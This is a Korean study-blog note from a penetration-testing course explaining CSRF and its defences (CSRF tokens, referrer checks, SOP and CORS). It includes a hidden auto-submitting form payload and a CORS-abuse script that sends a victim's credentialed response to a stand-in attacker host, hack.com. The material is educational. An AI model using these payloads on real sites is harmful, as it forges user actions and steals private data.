---
layout: post
comments: true
sitemap:
    changefreq:
    priority:

title: "[WEB HACKING] CSRF란?"
excerpt: "모의해킹 취업반 스터디 7기 12 ~ 13주차"

date: 2025-01-09
last_modified_at: 2025-01-18

categories: [SECURITY]
tags: [TIL, WEB, SECURITY]
---

# CSRF란?
## 1. 개요
**CRSF(Cross Site Request Forgery)**: 
-> 피해자가 서버로 공격자가 원하는 요청을 하게 만드는 것
웹 애플리케이션 취약점 중 하나로 사용자가 자신의 의지와 무관하게 공격자가 의도한 행동을 하여 특정 웹페이지를 보안에 취약하게 한다거나 수정, 삭제 등의 작업을 하게 만드는 공격방법을 의미한다. 유명 경매 사이트 옥션의 개인정보 유출 사건에 사용된 공격 방식이다.

## 취약점
모든 요청에서 발생 가능

## 공격방식

## 공격유형

## 공격 구문 예시
## post method로만 파라미터 전달이 가능할 때 csrf 공격방식
form tag를 삽입해야 한다 -> XSS로부터 무결해야 한다

```html
<iframe style="display:none" name="frame"></iframe>

<form method="POST" action="link" id="test" target="frame">
<input type="hidden" name="email" value="test@example.com"/>
</form>

<script>
document.getElementById('test').submit();
</script>
```

## 공격 순서
모든 요청에서 CSRF가 발생가능하다
이 요청은 위조해도 되는가
이 요청은 함부로 위조할 수 있는가

## 대응방안
### CSRF Token
csrf 공격을 막기 위해 만든 random한 token
마이페이지에 접근할 때 토큰 발행

```html
<form>
<input type="hidden" name="csrfToken" value="random_value">
</form>
```

정보를 수정할 때 csrf 토큰을 함께 받도록 요청한다
csrf 토큰도 탈취해야 하는구나?
사용자의 form 태그가 있는 페이지에 접근할 때 csrf 토큰이 발행된다

### referrer check
확장성이 떨어질 수 있다
개발자가 예외처리를 했을 경우
-> `<meta name='referrer' content='no-referrer'>`

### 요청을 위조할 수 없게 하자
파라미터에 모르는 데이터를 넣게 하자 -> 인증정보
인증정보를 넣는 것!

### SOP / CORS
#### SOP, Same-Origin Policy
다른 출처의 자원에 접근하지 못하게 브라우저가 막는 것

같은 출처의 기준
- 도메인
- 스키마
- 포트

#### CORS, Cross Origin Resource Sharing
다른 출처에서도 데이터를 쓸 수 있게 함

ACAO Header, Access Controll Allow Origin
-> 응답에 들어감

acao header에 요청이 존재하냐
자원을 허용할 도메인을 등록해두는 것이다

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get', 'https://target.com/seneitive-data', true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location = 'http://hack.com/log?key='+this.responseText;
    };
</script>
```

브라우저에 로드는 되는데 자바스크립트로 접근이 되냐 안되냐는 cors에 등록된 것만 가능하다

-> White List로 개발자가 하나하나 추가해줘야 함
하지만 개발자가 귀찮으시잖아~
`ACAO: *` -> SOP가 없는 것과 마찬가지다
다른 도메인에서 쿠키를 포함해서 요청한 것에 대한 응답은 * 못 씀
ACAC Header
Origin에 있는 데이터를 ACAO 헤더에 그대로 옮겨주자

CSRF
GET 방식이면 프리패스
POST -> XSS, form tag
CORS 정책이 잘 적용되어 있지 않다 -> 공격자 서버 만들어서 공격

# 참고
* [CSRF 공격과 방어 기법](https://velog.io/@gwanuuoo/CSRF-%EA%B3%B5%EA%B2%A9%EA%B3%BC-%EB%B0%A9%EC%96%B4-%EA%B8%B0%EB%B2%95)
* [Spring Security_CSRF Token의 개념과 사용 방법](https://codevang.tistory.com/282)
